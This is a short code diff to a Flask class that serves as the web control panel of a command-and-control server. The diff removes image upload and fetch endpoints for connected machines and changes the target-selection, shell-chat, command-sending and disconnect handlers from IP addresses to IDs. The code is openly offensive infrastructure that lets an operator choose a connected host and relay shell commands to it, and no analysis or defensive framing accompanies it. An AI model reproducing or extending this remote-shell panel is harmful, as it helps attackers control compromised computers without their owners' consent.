@@ -42,26 +42,7 @@ class FlskSevrev(object):
     
     def _valid_token(self,token):
         return token in self.c2Server.connections.keys
-    
-    def sendImage(self):
-        if not self._valid_token(getJsonKey(request.headers,'Bearer token',None)):
-            return jsonify({'status': 'Requiere valid token'}), 401
-        data = request.get_json()
-        Type = getJsonKey(data,'type', None)
-        ip = getJsonKey(data,'ip', None)
-        baseData = getJsonKey(data,'data',None)
-        if Type is  None or Type != "img" or baseData is None or ip is None:
-           return jsonify({'status': 'Error occurred - bad request'}), 403
-        conobj = self.c2Server.connections.getConnObj(ip)
-        conobj.commandManager.image = baseData
-        return jsonify({'status': 'completed'})
-    
-    def getImage(self):
-        ip = getJsonKey(request.get_json(),'ip',None)
-        if ip is None:
-           return jsonify({'data': 'Error occurred - bad request'}), 403
-        connObj = self.c2Server.connections.getConnObj(ip)
-        return jsonify({'data':connObj.commandManager.image})
+
 
     def signUp(self):
         data = request.get_json()
@@ -85,9 +66,9 @@ class FlskSevrev(object):
         return self.loginPage()
     
 
-    def getshellChat(self,hostname):
-        if self.c2Server.connections.isconnected(hostname):
-            return render_template('ChatBox.html',hostname=hostname)
+    def getshellChat(self,id):
+        if self.c2Server.connections.isconnected(id):
+            return render_template('ChatBox.html',hostname=id)
         return make_response("Page not found", 404)
     
 
@@ -97,7 +78,7 @@ class FlskSevrev(object):
     
     def choseTarget(self):
         data = request.get_json()
-        self.c2Server.connections.connctTo = data['ip']
+        self.c2Server.connections.connctTo = data['id']
         return {'Status': 'Completed'}
 
     def listConnections(self):
@@ -110,14 +91,14 @@ class FlskSevrev(object):
    
     def send_message(self):
         data = request.get_json()
-        connObj = self.c2Server.connections.getConnObj(data['ip'])
+        connObj = self.c2Server.connections.getConnObj(data['id'])
         msg = connObj.commandManager.retriveCommand(data['message'])
         return {'message': msg}
     
    
     def closeShell(self):
         data = request.get_json()
-        self.c2Server.connections.disconnect(data['ip'])
+        self.c2Server.connections.disconnect(data['id'])
         return {'Status':"Disconnect"}
     
     
